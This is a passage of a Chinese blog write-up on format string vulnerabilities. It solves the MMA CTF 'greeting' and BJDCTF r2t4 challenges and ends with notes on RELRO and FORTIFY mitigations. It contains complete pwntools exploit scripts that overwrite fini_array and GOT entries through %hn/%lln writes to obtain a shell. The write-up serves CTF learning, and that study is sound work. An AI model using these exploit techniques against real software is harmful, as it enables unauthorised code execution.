<p>发现 0x70256161 6161 是我们 的输入的a！显然没有对齐，我们在aaaa前面再加2a，于是<br>我们发送aaaaaa%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I'm nao!</span><br><span class="line">Please tell me your name... aaaaaa<span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span></span><br><span class="line">Nice <span class="keyword">to</span> meet you, aaaaaa<span class="number">0x80487d0</span>..<span class="number">0xffb9e0bc</span>..(nil)..(nil)..(nil)..(nil)..<span class="number">0x6563694e</span>..<span class="number">0x206f7420</span>..<span class="number">0x7465656d</span>..<span class="number">0x756f7920</span>..<span class="number">0x6161202c</span>..<span class="number">0x61616161</span>..<span class="number">0x2e2e7025</span>..<span class="number">0x2e2e7025</span>..% :)#</span><br></pre></td></tr></table></figure>

<p>发现是12偏移<br>aaaaaa的后四个a 的偏移 是 12  对应于 下面exp 中payload 中的 p32(fini_array) 位置处</p>
<p>其中  exp 中  %hn  是以 两字节  写入。<br>这里 之所以  payload 最开始 会 对 +18 感到 疑惑，其实 这是 因为   sprintf(&amp;s, “Nice to meet you, %s :)\n”, &amp;v5);    //格式化字符串漏洞   首先 会输出  18 字节的 格式化字符串。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">conn=process('./greeting')</span><br><span class="line">elf=ELF('./greeting')</span><br><span class="line">fini_array=0x08049934         <span class="comment">#readelf -S greeting</span></span><br><span class="line">start=0x080484f0          <span class="comment">#   ida  看的更方便嘛！</span></span><br><span class="line">system_plt=0x8048490         </span><br><span class="line">strlen_got=elf.got['strlen']</span><br><span class="line"><span class="comment">#print "strlen_got: "+hex(strlen_got)</span></span><br><span class="line"><span class="comment">#print "system_plt: "+hex(system_plt)</span></span><br><span class="line"><span class="comment">#print "fini_array: "+hex(fini_array)</span></span><br><span class="line"><span class="comment">#print "start: "+hex(start)</span></span><br><span class="line">conn.recv()</span><br><span class="line">payload='aa'+p32(fini_array)+p32(strlen_got+2)  <span class="comment">#18+2+4+4</span></span><br><span class="line">payload+=p32(strlen_got)+'%34000c%12$hn'        <span class="comment"># +4+34000=0x84f0</span></span><br><span class="line">payload+='%33556c%13$hn'                     <span class="comment">#0x84f0+33556=0x10804 截断=0x0804</span></span><br><span class="line">payload+='%31884c%14$hn'                     <span class="comment">#0x10804+31884=0x18049 截断=0x8049</span></span><br><span class="line">conn.sendline(payload)  <span class="comment">#此时已 一次性将 fini_array-&gt;start   strlen_got-&gt;system_plt</span></span><br><span class="line">conn.recv()                     <span class="comment">#程序重新运行了，接受Please tell me your name...</span></span><br><span class="line">conn.sendline('/bin/sh\x00')</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p>成功 getshell：<br><img src="https://s1.ax1x.com/2020/03/26/8zp1KS.png" alt="8zp1KS.png"></p>
<p>然后 最后 我再 说下 这题吧！<br>也是个  格式化字符串 任意写的 一个题型。</p>
<h1 id="BJDCTF-2nd-Pwn-r2t4"><a href="#BJDCTF-2nd-Pwn-r2t4" class="headerlink" title="BJDCTF 2nd - Pwn_r2t4"></a>BJDCTF 2nd - Pwn_r2t4</h1><p>这个程序 是 64位 并开启了  Canary保护的elf 文件，三天前比赛真题，还热乎着呢。</p>
<p>程序流程也很简单，输入什么 就输出 什么。当然这里是一个   很明显的 格式化字符串漏洞。<br>并程序 只运行  一遍，且含有 后门函数。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]                       </span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);             <span class="comment">//存在栈溢出 漏洞，但有canary 保护，虽然可通过任意地址写 可泄露canary，但程序只运行 一边。</span></span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面代码中的注释可知，栈溢出的方法  不可取， 因为程序开启了Canary   当函数返回的时候  会比较canary的 值 是否发生变化，如果不一致，就触发 __stack_chk_fail 函数。且程序中 含有后门函数。<br>我们可通过格式化字符串写  将backdoor_addr写入  __stack_chk_fail_got 中<br>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./r2t4"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26640</span>)</span><br><span class="line">elf=ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">__stack_chk_fail is 0x601018</span></span><br><span class="line"><span class="string">backdoor is 0x400626</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"__stack_chk_fail is "</span>+hex(__stack_chk_fail)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"backdoor is "</span>+hex(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(backdoor<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(__stack_chk_fail)<span class="comment">#  0x30</span></span><br><span class="line">payload+=(<span class="number">0x30</span><span class="number">-8</span>-len(payload))*<span class="string">'a'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,"b main")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功 getshell</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zp8bQ.png" alt="8zp8bQ.png"></p>
<p>最后最后简单 说下 </p>
<h1 id="和格式化字符串漏洞相关的漏洞缓解机制"><a href="#和格式化字符串漏洞相关的漏洞缓解机制" class="headerlink" title="和格式化字符串漏洞相关的漏洞缓解机制"></a>和格式化字符串漏洞相关的漏洞缓解机制</h1><p>这部分建议 阅读 下面参考链接吧。<br>参考链接：<br><a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43624-1-1.html</a><br>我们在checksec 程序的时候中 的RELRO 项：<br>RELRO是重定位表只读（Relocation Read Only）的缩写，即plt 和got 表，</p>
<ol>
<li>如果 这项的 内容 为  No RELRO的话  就代表  重定位表 不是仅可读的，我们在 漏洞利用的时候 可 优先考虑  修改某个函数的 got 表项，去达到 getshell 的目的。</li>
<li>如果  “其RELRO项为Partial RELRO 即该程序的重定位表项全部只读，无论是.got还是.got.plt都无法修改。改got表，程序不会报错，但是数据未被修改，</li>
<li>而如果 程序开启了Full RELRO保护之后，包括格式化字符串漏洞在内，试图通过漏洞劫持got表的行为都将会被阻止。</li>
<li>如果 是FORTIFY，这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。简单地说，加了这个保护之后（编译时加上参数-D_FORTIFY_SOURCE=2）一些敏感函数如read, fgets, memcpy, printf等等可能导致漏洞出现的函数都会被替换成<strong>read_chk, __fgets_chk, __memcpy_chk,</strong>printf_chk等。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查·诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。开启了FORTIFY保护的程序会被checksec检出，此外，在反汇编时直接查看got表也会发现chk函数的存在</li>
</ol>
<p>其实 ，不得说下 我对最后一个 FORTIFY ，还没怎么接触到。经验 太少！</p>

      
    </div>

    <div>
      
        
      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/PWN总结/" rel="tag">#PWN总结</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/04/19/House-Of-Roman技术分析及例题新解/" rel="next" title="House-Of-Roman技术分析及例题新解">
                <i class="fa fa-chevron-left"></i> House-Of-Roman技术分析及例题新解
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
          <p class="site-author-name" itemprop="name">木头</p>
          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">53</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">18</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          
		  <br>
		  <span id="busuanzi_container_site_uv">
			<b><span id="busuanzi_value_site_uv"></span></b><br>
			<span class="site-state-item-name">访客</span>
			</span>


        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
    
		<br>
		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
		<b><h1>个人简介</h1></b>
		<p>姓名：木头<br>
		性别：男<br>
		QQ：1594783824<br>
		爱好：书,球,歌<br>
		主要奖项： xxx</p>
		</div>
		<br>

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#printf"><span class="nav-number">2.</span> <span class="nav-text">printf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#printf-–一个参数：情况1"><span class="nav-number">2.0.1.</span> <span class="nav-text">printf –一个参数：情况1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#printf-–一个参数：情况2"><span class="nav-number">2.0.2.</span> <span class="nav-text">printf –一个参数：情况2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#printf-–两个参数："><span class="nav-number">2.0.3.</span> <span class="nav-text">printf –两个参数：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#printf-–三个参数："><span class="nav-number">2.0.4.</span> <span class="nav-text">printf –三个参数：</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#任意地址-读"><span class="nav-number">3.</span> <span class="nav-text">任意地址 读</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任意地址-写"><span class="nav-number">4.</span> <span class="nav-text">任意地址 写</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#n系列"><span class="nav-number">5.</span> <span class="nav-text">%n系列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwntools之-Fmtstr"><span class="nav-number">6.</span> <span class="nav-text">pwntools之 Fmtstr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MMA-CTF-2nd-2016-greeting"><span class="nav-number">7.</span> <span class="nav-text">MMA CTF 2nd 2016-greeting</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF-2nd-Pwn-r2t4"><span class="nav-number">8.</span> <span class="nav-text">BJDCTF 2nd - Pwn_r2t4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#和格式化字符串漏洞相关的漏洞缓解机制"><span class="nav-number">9.</span> <span class="nav-text">和格式化字符串漏洞相关的漏洞缓解机制</span></a></li></div>
            
          </div>
        </section>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">木头</span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>

</div>


<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  



  
  
  

  

  

</body>
</html>
